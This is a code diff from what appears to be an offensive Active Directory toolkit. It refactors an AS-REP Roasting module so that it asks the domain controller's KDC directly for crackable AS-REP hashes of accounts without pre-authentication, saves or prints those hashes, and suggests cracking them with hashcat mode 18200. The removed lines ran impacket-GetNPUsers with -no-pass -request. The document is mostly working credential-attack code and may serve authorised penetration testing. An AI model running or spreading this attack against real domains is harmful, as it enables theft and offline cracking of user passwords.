@@ -3,6 +3,7 @@
 #include "Attacks.h"
 #include <sstream>
 #include "utils/Colors.h"
+#include "utils/Utils.h"
 #include "cli/ArgumentParser.h"
 #include "core/ActiveDirectory.h"
 #include "core/ModuleRegistry.h"
@@ -11,11 +12,12 @@ namespace {
 const ModuleRegistry::Registrar registrar(
     Modules::ASREPROAST,
     [](const ModuleFactoryContext& ctx) -> std::unique_ptr<Module> {
-        return std::make_unique<Attacks::ASREPRoast>(ctx.ldapService);
+        return std::make_unique<Attacks::ASREPRoast>(ctx.ldapService, ctx.krbService);
     });
 }  // namespace
 
-Attacks::ASREPRoast::ASREPRoast(LdapQuerier& ldap_) : ldap(ldap_) {}
+Attacks::ASREPRoast::ASREPRoast(LdapQuerier& ldap_, KerberosInteraction& krb_)
+    : ldap(ldap_), krb(krb_) {}
 
 std::string Attacks::ASREPRoast::extractDomainFromDN(const std::string& baseDN) {
     std::string domain;
@@ -73,20 +75,20 @@ std::vector<std::string>  Attacks::ASREPRoast::listUser(const std::string& baseD
     return asreproast_user;
 }
 
-bool Attacks::ASREPRoast::requestTicket(const std::string& vuln_user, const std::string& domain) {
-    std::cout << Colors::COLOR_YELLOW << "\n[*] Requesting AS-REP ticket for: " << vuln_user  << Colors::COLOR_RESET << std::endl;
+std::string Attacks::ASREPRoast::requestTicket(
+    const std::string& vulnUser,
+    const std::string& realm,
+    const std::string& kdcHost
+) {
+    std::cout << Colors::COLOR_YELLOW << "\n[*] Requesting AS-REP for: " << vulnUser
+              << Colors::COLOR_RESET << std::endl;
 
-    std::string cmd = "impacket-GetNPUsers " + domain + "/" + vuln_user + " -no-pass -request -format hashcat";
-    int result = system(cmd.c_str());
-
-    if (result == 0) {
-        std::cout << Colors::COLOR_GREEN << "  [+] Hash for " << vuln_user << " successfully retrieved" << Colors::COLOR_RESET << std::endl;
-        std::cout << "  [*] To crack, run: hashcat -m 18200 hash /path/to/wordlist.txt" << std::endl;
-        return true;
-    } else {
-        std::cerr << Colors::COLOR_RED << "  [-] Failed to request ticket for " << vuln_user << ". Is impacket-GetNPUsers in your PATH?" << Colors::COLOR_RESET << std::endl;
-        return false;
+    std::string hash = krb.requestAndFormatASREP(vulnUser, realm, kdcHost);
+    if (!hash.empty()) {
+        std::cout << Colors::COLOR_GREEN << "  [+] Hash retrieved for " << vulnUser
+                  << Colors::COLOR_RESET << std::endl;
     }
+    return hash;
 }
 
 void Attacks::ASREPRoast::run(const ModuleRuntimeContext& ctx) {
@@ -97,9 +99,25 @@ void Attacks::ASREPRoast::run(const ModuleRuntimeContext& ctx) {
         return;
     }
 
-    std::string domain = extractDomainFromDN(ctx.baseDN);
+    std::string realm = extractDomainFromDN(ctx.baseDN);
+    std::vector<std::pair<std::string, std::string>> hashesToSave;
+    bool saveToFile = !ctx.outputFilePath.empty();
 
     for (const std::string& user : vuln_users) {
-        requestTicket(user, domain);
+        std::string hash = requestTicket(user, realm, ctx.dcHost);
+        if (hash.empty()) {
+            continue;
+        }
+        if (saveToFile) {
+            hashesToSave.emplace_back(user, hash);
+        } else {
+            std::cout << hash << "\n\n";
+        }
+    }
+
+    if (saveToFile) {
+        Utils::saveToFile(hashesToSave, ctx.outputFilePath);
+    } else if (!hashesToSave.empty() || !vuln_users.empty()) {
+        std::cout << "[*] Crack with: hashcat -m 18200 <hashfile> <wordlist>" << std::endl;
     }
 }
